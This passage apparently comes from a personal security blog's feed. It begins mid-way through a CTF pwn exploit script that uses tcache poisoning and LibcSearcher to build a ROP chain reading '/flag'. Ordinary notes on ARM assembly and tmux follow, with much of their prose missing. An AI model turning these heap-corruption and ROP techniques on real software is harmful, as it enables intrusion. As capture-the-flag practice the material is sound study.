class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_r15=base+<span class="number">0x0000000000023b68</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#24</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#25</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">25</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM ASM</title>
      <link href="/2023/07/14/arm-asm/"/>
      <url>/2023/07/14/arm-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h1><p>  <a href="https://developer.arm.com/documentation/ddi0487/fc/">https://developer.arm.com/documentation/ddi0487/fc/</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><table><thead><tr><th>Reg</th><th>APCS</th><th>mean</th></tr></thead><tbody><tr><td>R0</td><td>A1</td><td></td></tr><tr><td>R1</td><td>A2</td><td></td></tr><tr><td>R2</td><td>A3</td><td></td></tr><tr><td>R3</td><td>A4</td><td></td></tr><tr><td>R4</td><td>V1</td><td>()</td></tr><tr><td>R5</td><td>V2</td><td></td></tr><tr><td>R6</td><td>V3</td><td></td></tr><tr><td>R7</td><td>V4</td><td></td></tr><tr><td>R8</td><td>V5</td><td></td></tr><tr><td>R9</td><td>V6&#x2F;SB</td><td></td></tr><tr><td>R10</td><td>V7&#x2F;SL</td><td></td></tr><tr><td><strong>R11</strong></td><td>V8&#x2F;<strong>FP</strong></td><td>x86 ebp</td></tr><tr><td>R12</td><td>IP</td><td>(sp)</td></tr><tr><td><strong>R13</strong></td><td><strong>SP</strong></td><td>x86 esp</td></tr><tr><td><strong>R14</strong></td><td><strong>LR</strong></td><td>Link Register</td></tr><tr><td><strong>R15</strong></td><td><strong>PC</strong></td><td></td></tr><tr><td>CPSR</td><td></td><td>Current Program Status Register </td></tr><tr><td>SPSR</td><td></td><td>Saved Program Status Register CPSR</td></tr></tbody></table><blockquote><p>APCS ARM Procedure Call Standard</p></blockquote><ul><li><code>R0 ~ R3</code></li><li><code>R0</code></li><li><code>R7</code></li><li><code>R11</code>x86<code>ebp</code><code>arm</code><code>FP</code></li><li><code>R13</code>x86<code>esp</code><code>arm</code><code>SP</code></li><li><code>R14(LP)</code></li></ul><p>pcmov pcr0</p><p>armpcldr r0,[pc],mov r0,pc r0&#x3D;pc+8</p><p>thumb+4thumb<strong>+4</strong></p><p>ldr r0,[pc] pc+4</p><p><img src="/2023/07/14/arm-asm/image-20230718115628492.png" alt="image-20230718115628492"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li></li><li></li><li></li></ul><p>&lt;opcode&gt; {&lt;cond&gt;} {S} &lt;Rd&gt; , &lt;Rn&gt; { , <shift_op2> }</shift_op2></p><ul><li>opcode:  </li><li>cond </li><li>S,SCPSR</li><li>Rd</li><li>Rn</li><li>op2</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="/2023/07/14/arm-asm/image-20230714202416326.png" alt="image-20230714202416326"></p><p><img src="/2023/07/14/arm-asm/image-20230714211613500.png" alt="image-20230714211613500"></p><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p>arm<code>mov</code></p><p>mov</p><p>mov r0,0x4567 r016(r0160)</p><p>movt r0,0x1234 r016</p><p><code>mov r1, #0x10r1 = 0x10</code></p><p><code>mov r1, r2r1 = r2</code></p><p><code>mov r1, r2, LSL#2r1 = r2 &lt;&lt; 2</code> </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>add adds cmn</strong> ss</p><p><code>add r1, r2, #2</code> : <code>r1 = r2 + 2</code></p><p><code>add r1,r2,r3</code> : <code>r1=r2+r3</code></p><p><code>add r1, r2, LSL#2</code> : <code>r1 = r2 &lt;&lt; 2</code></p><p><strong>sub subs cmp</strong> </p><p><code>sub r1, r2, r3</code> : <code>r1 = r2 - r3</code></p><p><strong>rsb</strong></p><p><code>rsb r0,r1,#8</code> : <code>r0=8-r1</code></p><p><strong>and</strong></p><p><strong>tst</strong></p><p><code>and and r0,r1,r2</code> : <code>r0 = r1&amp;r2</code></p><p><strong>bic</strong></p><p><code>bic r0,r1,r2</code> :<code>r0=(~r1)&amp;(~r2)</code></p><p><strong>oor</strong> </p><p><strong>eor</strong> </p><p><strong>teq</strong></p><p><strong>lsl</strong>(logic shift left)</p><p></p><p><strong>lsr</strong>(logic shift right)</p><p></p><p><strong>asr</strong>(arithmatic shift right)</p><p>31</p><p><strong>ROR</strong></p><p></p><p><strong>mvn</strong>(Move Not)</p><p><code>MVN r1,r2</code> : <code>r1=~r2</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>LDR</strong></p><p><code>LDR &#123;cond&#125; Rd, &lt;addr&gt;</code>(<code>addr</code>)()<code>Rd</code></p><p><strong>STR</strong></p><p><code>STR &#123;cond&#125; Rd, &lt;addr&gt;</code><code>Rd</code>()(<code>addr</code>)</p><p><strong>ADR</strong></p><p>ADR register,exper <strong></strong>,PC</p><p>PCexper,ADDSUB</p><p>adridaadradd </p><p>ida</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.plt:<span class="number">00010304</span> <span class="number">00</span> C6 <span class="number">8F</span> E2                   ADR     R12, <span class="number">0x1030C</span></span><br><span class="line">.plt:<span class="number">00010308</span> <span class="number">10</span> CA <span class="number">8</span>C E2                   ADD     R12, R12, #<span class="number">0x10000</span></span><br><span class="line">.plt:<span class="number">0001030</span>C <span class="number">04</span> FD BC E5                   LDR     PC, [R12,#(printf_ptr - <span class="number">0x2030C</span>)]! ; __imp_printf</span><br></pre></td></tr></table></figure><p>objdump</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00010304</span> &lt;<span class="built_in">printf</span>@plt&gt;:                                                                                                                                                                                             </span><br><span class="line"><span class="number">10304</span>:       e28fc600        add     ip, pc, #<span class="number">0</span>, <span class="number">12</span>                                                                                                                                                             </span><br><span class="line"><span class="number">10308</span>:       e28cca10        add     ip, ip, #<span class="number">16</span>, <span class="number">20</span> ; <span class="number">0x10000</span>                                                                                                                                                  </span><br><span class="line"><span class="number">1030</span>c:       e5bcfd04        ldr     pc, [ip, #<span class="number">3332</span>]!        ; <span class="number">0xd04</span> </span><br></pre></td></tr></table></figure><p>10304add12020</p><p>103081620</p><p>1030cgotprintf</p><p><a href="https://reverseengineering.stackexchange.com/questions/16154/arm-add-instruction-with-shift#:~:text=Unlike%20a%20logical%20shift%2C%20the%20vacant%20bit%20positions,%2B%20%280%20%3C%3C%2012%29%20%3D%20PC%20%2B%200">https://reverseengineering.stackexchange.com/questions/16154/arm-add-instruction-with-shift#:~:text=Unlike%20a%20logical%20shift%2C%20the%20vacant%20bit%20positions,%2B%20%280%20%3C%3C%2012%29%20%3D%20PC%20%2B%200</a></p><p><a href="https://stackoverflow.com/questions/16207865/weird-gas-arm-syntax">https://stackoverflow.com/questions/16207865/weird-gas-arm-syntax</a></p><blockquote><p>cpuloadstore</p></blockquote><p><code>str r2, [r1, #2]</code><code>r2</code><code>r1</code><code>2</code><code>r1</code>;</p><p><code>str r2, [r1, #2]!</code><code>r1 += 2</code><code>&#123;!&#125;</code>r1(<code>Rn</code>);</p><p><code>ldr r2, [r1], #-2</code><code>r1</code><code>r2</code><code>r1 -= 2</code></p><p><code>str r2, [r1, r3, LSL#2]</code><code>r2</code><code>r1</code><code>r3</code></p><p><code>ldr r2, [r1], r3, LSL#2</code><code>r1</code><code>r2</code><code>r1 += r3 &lt;&lt; 2</code>.</p><p><code>str r0,[sp,#-4]!</code>: push r0</p><p><code>ldr r0,[sp],#4</code>:pop r0</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><a href="https://blog.csdn.net/stephenbruce/article/details/51151147">https://blog.csdn.net/stephenbruce/article/details/51151147</a></p><p><strong>ldm</strong> load</p><p><strong>stm</strong>store</p><p></p><p> IA  -&gt;  Increment  After  <em><strong></strong></em><em><strong>4</strong></em><br> IB  -&gt;  Increment  Before  <em><strong></strong></em><em><strong>4</strong></em><br> DA  -&gt;  Decrement  After  <em><strong></strong></em><em><strong>4</strong></em><br> DB  -&gt;  Decrement  Before  <em><strong></strong></em><em><strong>4</strong></em></p><p> <strong>STMLDM</strong></p><p> FA  -&gt;  Full  Ascending      fullsp<br> FD  -&gt;  Full  Descending   <br> EA  -&gt;  Empty  Ascending      Empty sp sp+4<br> ED  -&gt;  Empty  Descending  </p><p>ldmfd&#x3D;ldmiastmfd&#x3D;stmdb</p><p><strong>STMFD   SP!, {R4-R11,LR} push R4-R11 push LR</strong></p><p><strong>SP</strong></p><p><strong>LDMFD   SP!, {R4-R11,LR} pop</strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>B imm x86 jmp</p><p>BL imm  cpsrt(t1thumb)lr</p><p>BLX imm blx+ call</p><p>BX reg  <strong>regbitcpsrt</strong>regbit0jmpreg </p><p>BLX reg bx+cpsrt(t1thumb)lr</p><p>mov pcreg</p><p>BEQ #  jne<br>BCC # cmp0  &lt;<br>BGT # <br>BLT #<br>BCS #cmp  &gt;&#x3D;</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>r0-r3</p><p> r4-r11</p><p>r12</p><p>x86()pc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x=<span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00010420</span>                               ; <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">.text:00010420                               EXPORT main</span><br><span class="line">.text:00010420                               main                                    ; DATA XREF: _start+<span class="number">30</span>o</span><br><span class="line">.text:<span class="number">00010420</span>                                                                       ; .got:main_ptro</span><br><span class="line">.text:<span class="number">00010420</span></span><br><span class="line">.text:<span class="number">00010420</span>                               x= <span class="number">-8</span></span><br><span class="line">.text:<span class="number">00010420</span></span><br><span class="line">.text:<span class="number">00010420</span> <span class="number">00</span> <span class="number">48</span> <span class="number">2</span>D E9                   PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:<span class="number">00010424</span> <span class="number">04</span> B0 <span class="number">8</span>D E2                   ADD     R11, SP, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00010428</span> <span class="number">08</span> D0 <span class="number">4</span>D E2                   SUB     SP, SP, #<span class="number">8</span></span><br><span class="line">.text:<span class="number">0001042</span>C <span class="number">24</span> <span class="number">30</span> <span class="number">9F</span> E5                   LDR     R3, =<span class="number">0x12345678</span></span><br><span class="line">.text:<span class="number">00010430</span> <span class="number">08</span> <span class="number">30</span> <span class="number">0B</span> E5                   STR     R3, [R11,<span class="meta">#x]</span></span><br><span class="line">.text:<span class="number">00010434</span> <span class="number">20</span> <span class="number">00</span> <span class="number">9F</span> E5                   LDR     R0, =aHelloWorld                ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">00010438</span> B1 FF FF EB                   BL      <span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0001043</span>C <span class="number">08</span> <span class="number">10</span> <span class="number">1B</span> E5                   LDR     R1, [R11,<span class="meta">#x]</span></span><br><span class="line">.text:<span class="number">00010440</span> <span class="number">18</span> <span class="number">00</span> <span class="number">9F</span> E5                   LDR     R0, =aX                         ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">00010444</span> AE FF FF EB                   BL      <span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">00010448</span> <span class="number">00</span> <span class="number">30</span> A0 E3                   MOV     R3, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0001044</span>C <span class="number">03</span> <span class="number">00</span> A0 E1                   MOV     R0, R3</span><br><span class="line">.text:<span class="number">00010450</span> <span class="number">04</span> D0 <span class="number">4B</span> E2                   SUB     SP, R11, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00010454</span> <span class="number">00</span> <span class="number">88</span> BD E8                   POP     &#123;R11,PC&#125;</span><br><span class="line">.text:<span class="number">00010454</span>                               ; End of function main</span><br><span class="line">.text:<span class="number">00010454</span></span><br><span class="line">.text:<span class="number">00010454</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00010458</span> <span class="number">78</span> <span class="number">56</span> <span class="number">34</span> <span class="number">12</span>                   dword_10458 DCD <span class="number">0x12345678</span>              ; DATA XREF: main+Cr</span><br><span class="line">.text:<span class="number">0001045</span>C                               ; <span class="type">char</span> *<span class="type">const</span> format</span><br><span class="line">.text:<span class="number">0001045</span>C <span class="number">00</span> <span class="number">05</span> <span class="number">01</span> <span class="number">00</span>                   format DCD aHelloWorld                  ; DATA XREF: main+<span class="number">14</span>r</span><br><span class="line">.text:<span class="number">0001045</span>C                                                                       ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">00010460</span>                               ; <span class="type">char</span> *<span class="type">const</span> off_10460</span><br><span class="line">.text:<span class="number">00010460</span> <span class="number">0</span>C <span class="number">05</span> <span class="number">01</span> <span class="number">00</span>                   off_10460 DCD aX                        ; DATA XREF: main+<span class="number">20</span>r</span><br><span class="line">.text:<span class="number">00010460</span>                               ; .text ends                            ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">00010460</span></span><br><span class="line">.fini:<span class="number">00010464</span>                               ; ========================================================</span><br><span class="line">.rodata:<span class="number">00010500</span> <span class="number">68</span> <span class="number">65</span> <span class="number">6</span>C <span class="number">6</span>C <span class="number">6F</span> <span class="number">2</span>C <span class="number">77</span> <span class="number">6F</span> <span class="number">72</span> <span class="number">6</span>C+aHelloWorld DCB <span class="string">&quot;hello,world&quot;</span>,<span class="number">0</span>         ; DATA XREF: main+<span class="number">14</span>o</span><br></pre></td></tr></table></figure><p>ida<code> LDR     R3, =0x12345678</code>idapc(ldr r3,[pc,#imm])idaq</p><p><img src="/2023/07/14/arm-asm/image-20230719203353466.png" alt="image-20230719203353466"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tmux</title>
      <link href="/2023/07/11/tmux/"/>
      <url>/2023/07/11/tmux/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tmuxcheatsheet.com/">https://tmuxcheatsheet.com/</a></p><p>prefix:ctrl b</p><p>:pre+c</p><p>:pre+numberpre+p pre+n</p><p>:pre+&amp;</p><p>:pre+%</p><p>:pre+</p><p>:pre+x</p><p>:pre+z</p><p>:pre+pre+q+number</p><p>:pre+w</p><p>detached:pre+d</p><p>attach:tmux a (tmux attach)</p><p>:tmux ls</p><p>:tmux attach -t [number]</p><p><strong>~&#x2F;.tmux.conf</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># set-option -sa terminal-overrides <span class="string">&quot;,xterm*:Tc&quot;</span></span></span><br><span class="line"><span class="built_in">set</span> -g <span class="keyword">default</span>-terminal <span class="string">&quot;screen-256color&quot;</span></span><br><span class="line"><span class="built_in">set</span>-option -ga terminal-overrides <span class="string">&quot;,*256col*:Tc&quot;</span></span><br><span class="line">setw -g mode-keys vi</span><br><span class="line"><span class="meta"># set-option default-path <span class="string">&quot;$PWD&quot;</span></span></span><br><span class="line"><span class="built_in">set</span> -s escape-time <span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> -sg repeat-time <span class="number">300</span></span><br><span class="line"><span class="built_in">set</span> -s focus-events on</span><br><span class="line"><span class="built_in">set</span> -g mouse on</span><br><span class="line"><span class="built_in">set</span> -sg <span class="built_in">exit</span>-empty on</span><br><span class="line"><span class="built_in">set</span> -q -g status-utf8 on</span><br><span class="line">setw -q -g utf8 on</span><br><span class="line"><span class="built_in">set</span> -g visual-activity off</span><br><span class="line">setw -g monitor-activity off</span><br><span class="line">setw -g monitor-bell off</span><br><span class="line">#  Ctrl + b + hjkl </span><br><span class="line">bind h select-pane -L                       # </span><br><span class="line">bind j select-pane -D                       # </span><br><span class="line">bind k select-pane -U                       # </span><br><span class="line">bind l select-pane -R                       # </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 googlectf pwn</title>
      <link href="/2023/07/10/googlectf-pwn/"/>
      <url>/2023/07/10/googlectf-pwn/</url>
      
